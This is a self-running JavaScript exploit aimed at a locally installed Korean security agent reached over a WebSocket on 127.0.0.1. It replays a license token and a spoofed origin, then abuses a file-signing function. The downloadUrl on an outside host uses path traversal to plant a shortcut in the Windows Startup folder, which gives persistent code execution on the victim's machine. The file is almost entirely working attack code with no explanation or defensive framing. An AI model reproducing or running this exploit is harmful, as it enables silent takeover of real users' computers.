(function () {
  const wsUrl = 'wss://127.0.0.1:34581/raon/touchenex/Call';

  const messages = [
    {
      tabid: "1751477550816_452314",
      init: "get_versions",
      m: "biz",
      origin: "https://e-shy.net",
      lic: "eyJ2ZXJzaW9uIjoiMS4wIiwiaXNzdWVfZGF0ZSI6IjIwMjUwNTEyMTIxNjAzIiwicHJvdG9jb2xfbmFtZSI6InRvdWNoZW5leCIsInV1aWQiOiJmOGY2M2VkMzI5YTc0MjNkYmU5NGYzZjQ1Nzg2YmMxZCIsImxpY2Vuc2UiOiJHbUFJeERsR0M1cGhGOVJJdjhEdUZJTGIzNE10Q3UvNFdHT2RHSENHZnoxRTNVSmpkcFNXYW9LUEFQUnYyMjRYK0lWekQ2dU5JUjNtdFNOY3BnR21pT3loSEJncUhlU1c5SWpudmFhK0dla1RTZzkvTGdzckpMeFpLMnVYQUNKUTluQ1RBRHcrSmludVdPWDc5a2xrVDl4cDZjaWt5SXFuSkQwYVJ6VUxvSkU9In0=",
      callback: ""
    },
    {
      id: "1751741104028_377391",
      tabid: "1751477550816_452314",
      module: "biz",
      cmd: "native",
      origin: "https://e-shy.net",
      exfunc: {
        fname: "init",
        args: [
          {
            verify: "true",
            sid: "1751136111053377391"
          }
        ]
      },
      callback: "ksbizInterface.commonCallback"
    },
    {
      id: "1751477574121_975409",
      tabid: "1751477550816_452314",
      module: "biz",
      cmd: "native",
      origin: "https://e-shy.net",
      exfunc: {
        fname: "addSignFileUrl",
        args: [
          {
            data: "3333333333333%26ksbizNonce%3D38AFEC39CB79F1276EBE",
            url: "https://localhost/file-to-sign.pdf",
            downloadUrl: "https://winter.hoyul3467.workers.dev/aaa\\..\\..\\..\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.lnk",
            uploadUrl: "https://localhost/",
            options: {
              addNonce: true,
              signedAttribute: "signingTime",
              signAlgorithm: "SEED-CBC",
              disableExpireFilter: false,
              disableExpireWarn: false,
              autosign: "1"
            },
            sid: "1751136111053377391"
          }
        ]
      },
      callback: "ksbizInterface.commonCallback"
    }
  ];

  let step = 0;

  const log = (msg) => {
    const el = document.getElementById("log");
    if (el) el.textContent += msg + "\n";
    
  };

  const ws = new WebSocket(wsUrl);

  ws.onopen = () => {
    sendMessage();
  };

  ws.onmessage = (event) => {
    if (step === 0 || step === 1) {
      step++;
      setTimeout(sendMessage, 300);
    }
  };

  ws.onerror = (event) => {
    
  };

  ws.onclose = () => {
    
  };

  function sendMessage() {
    if (step < messages.length) {
      const msg = JSON.stringify(messages[step]);
      
      ws.send(msg);
    } else {
      
      ws.close();
    }
  }
})();
